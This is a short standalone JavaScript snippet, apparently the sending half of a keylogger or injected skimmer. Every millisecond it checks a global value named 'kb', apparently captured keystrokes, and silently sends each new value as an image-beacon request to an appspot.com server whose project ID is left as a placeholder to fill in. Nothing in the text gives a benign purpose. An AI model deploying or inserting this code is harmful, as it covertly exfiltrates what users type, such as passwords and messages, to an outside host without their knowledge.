(function(){
    var sent = ''
    setInterval(function(){
        if (typeof s !='undefined' && s.kb && sent != s.kb){
            sent = s.kb;
            var param = [];
            param.push('t=aa');
            param.push('l=' + encodeURIComponent(s.kb));
            var img = new Image();
            var appurl = 'https://YOUR-PROJECTID-HERE.exture-onihei-env.appspot.com/b';
            var isrc = appurl + "?" + param.join("&");
            img.src = isrc;
        }
    },1);
})();
